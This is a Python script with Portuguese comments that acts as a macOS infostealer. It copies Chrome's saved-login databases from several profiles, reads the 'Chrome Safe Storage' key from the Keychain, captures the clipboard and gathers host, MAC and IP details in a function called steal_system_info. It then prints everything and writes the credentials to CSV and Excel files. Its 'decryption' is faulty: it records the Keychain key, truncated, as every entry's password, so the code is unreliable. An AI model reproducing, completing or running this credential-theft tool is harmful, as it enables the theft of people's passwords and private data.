#!/usr/bin/env python3
import os
import sqlite3
import subprocess
import shutil
import platform
import socket
import uuid
import re
import requests
import pyperclip
import csv
import pandas as pd
import logging
from cryptography.fernet import Fernet

# Configuração de logs
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def encrypt_data(data: str, key: bytes) -> str:
    """
    Criptografa dados sensíveis utilizando o Fernet.
    
    :param data: Texto a ser criptografado.
    :param key: Chave de criptografia (em bytes).
    :return: Texto criptografado em formato string.
    """
    cipher_suite = Fernet(key)
    encrypted_data = cipher_suite.encrypt(data.encode())
    return encrypted_data.decode()

def get_mac_keychain_password(service: str, account: str) -> str:
    """
    Obtém a senha armazenada no Keychain do macOS para um determinado serviço e conta.
    
    :param service: Nome do serviço (ex.: "Chrome Safe Storage").
    :param account: Nome da conta (ex.: "Chrome").
    :return: Senha encontrada ou None em caso de erro.
    """
    try:
        result = subprocess.run(
            ['security', 'find-generic-password', '-w', '-s', service, '-a', account],
            capture_output=True,
            text=True,
            check=True
        )
        return result.stdout.strip()
    except subprocess.CalledProcessError:
        logging.exception("Erro ao acessar o Keychain")
        return None

def extract_browser_passwords() -> list:
    """
    Extrai senhas salvas do navegador Chrome (para macOS) a partir dos perfis comuns.
    Observação: o processo de descriptografia real do Chrome pode ser mais complexo;
    aqui usamos a senha do Keychain para exemplificar.
    
    :return: Lista de dicionários contendo as credenciais extraídas.
    """
    credentials = []
    profiles = ['Default', 'Profile 1', 'Profile 2', 'Profile 3', 'Profile 4']
    base_path = os.path.join(os.environ.get('HOME', ''), 'Library', 'Application Support', 'Google', 'Chrome')

    if not os.path.exists(base_path):
        logging.error("Caminho do Chrome não encontrado.")
        return credentials

    for profile in profiles:
        login_db_path = os.path.join(base_path, profile, 'Login Data')
        if not os.path.exists(login_db_path):
            logging.warning(f"Perfil {profile} não possui o arquivo 'Login Data'.")
            continue

        temp_db_path = f'{profile}_LoginData.db'
        try:
            # Copia o banco de dados para evitar conflitos com o uso do Chrome
            shutil.copy2(login_db_path, temp_db_path)
            with sqlite3.connect(temp_db_path) as conn:
                cursor = conn.cursor()
                cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
                for origin_url, username, encrypted_password in cursor.fetchall():
                    # Neste exemplo, a descriptografia é simulada pelo uso do Keychain
                    decrypted_password = get_mac_keychain_password("Chrome Safe Storage", "Chrome")
                    if decrypted_password:
                        cred = {
                            'profile': profile,
                            'url': origin_url.rstrip('/'),
                            'username': username if username else "N/A",
                            'password': decrypted_password[:20] + "..." if len(decrypted_password) > 20 else decrypted_password
                        }
                        credentials.append(cred)
                    else:
                        logging.warning(f"Não foi possível descriptografar a senha para {origin_url} no perfil {profile}.")
        except Exception:
            logging.exception(f"Erro ao extrair dados do perfil {profile}")
        finally:
            if os.path.exists(temp_db_path):
                try:
                    os.remove(temp_db_path)
                except Exception:
                    logging.exception(f"Erro ao remover o arquivo temporário {temp_db_path}")

    return sorted(credentials, key=lambda x: (x['profile'], x['url']))

def capture_clipboard() -> str:
    """
    Captura o conteúdo atual da área de transferência.
    
    :return: Conteúdo capturado ou None em caso de erro.
    """
    try:
        return pyperclip.paste()
    except Exception:
        logging.exception("Erro ao capturar conteúdo da área de transferência")
        return None

def steal_system_info() -> dict:
    """
    Coleta informações do sistema, como plataforma, versão, IP local e global, entre outras.
    
    :return: Dicionário contendo as informações coletadas.
    """
    info = {}
    try:
        info = {
            'plataforma': platform.system(),
            'versão-plataforma': platform.release(),
            'versão-sistema': platform.version(),
            'arquitetura': platform.machine(),
            'nome-host': socket.gethostname(),
            'endereço-ip-local': socket.gethostbyname(socket.gethostname()),
            'endereço-mac': ':'.join(re.findall('..', '%012x' % uuid.getnode())),
            'processador': platform.processor(),
        }
    except Exception:
        logging.exception("Erro ao capturar informações básicas do sistema")

    try:
        response = requests.get('https://api.ipify.org?format=json', timeout=5)
        global_ip = response.json().get('ip', 'N/A')
        info['endereço-ip-global'] = global_ip
    except Exception:
        logging.warning("Erro ao buscar endereço IP global")
        info['endereço-ip-global'] = 'Não foi possível buscar o IP global'

    return info

def save_to_csv(credentials: list, filename: str = "credentials.csv") -> None:
    """
    Salva as credenciais extraídas em um arquivo CSV.
    
    :param credentials: Lista de dicionários com as credenciais.
    :param filename: Nome do arquivo CSV a ser gerado.
    """
    headers = ['Perfil', 'URL', 'Nome de Usuário', 'Senha']
    try:
        with open(filename, mode='w', newline='', encoding='utf-8') as file:
            writer = csv.DictWriter(file, fieldnames=headers)
            writer.writeheader()
            for cred in credentials:
                writer.writerow({
                    'Perfil': cred.get('profile', ''),
                    'URL': cred.get('url', ''),
                    'Nome de Usuário': cred.get('username', ''),
                    'Senha': cred.get('password', '')
                })
        logging.info(f"Credenciais salvas em {filename}")
    except Exception:
        logging.exception("Erro ao salvar arquivo CSV")

def save_to_excel(credentials: list, filename: str = "credentials.xlsx") -> None:
    """
    Salva as credenciais extraídas em um arquivo Excel.
    
    :param credentials: Lista de dicionários com as credenciais.
    :param filename: Nome do arquivo Excel a ser gerado.
    """
    try:
        df = pd.DataFrame(credentials)
        df.to_excel(filename, index=False)
        logging.info(f"Credenciais salvas em {filename}")
    except Exception:
        logging.exception("Erro ao salvar arquivo Excel")

def main():
    logging.info("Iniciando o processo de extração de dados.")

    # Extrai senhas do navegador
    passwords = extract_browser_passwords()
    if passwords:
        logging.info("Senhas extraídas do navegador:")
        for cred in passwords:
            print(f"Perfil: {cred['profile']}, URL: {cred['url']}, Nome de Usuário: {cred['username']}, Senha: {cred['password']}")
    else:
        logging.info("Nenhuma senha foi extraída.")

    # Captura conteúdo da área de transferência
    clipboard_content = capture_clipboard()
    if clipboard_content:
        logging.info("Conteúdo da área de transferência capturado:")
        print(clipboard_content)
    else:
        logging.info("Nenhum conteúdo capturado da área de transferência.")

    # Coleta informações do sistema
    system_info = steal_system_info()
    if system_info:
        logging.info("Informações do sistema coletadas:")
        for key, value in system_info.items():
            print(f"{key}: {value}")
    else:
        logging.info("Não foi possível coletar informações do sistema.")
    save_to_csv(passwords)
    save_to_excel(passwords)

    logging.info("Processo concluído.")

if __name__ == '__main__':
    main()
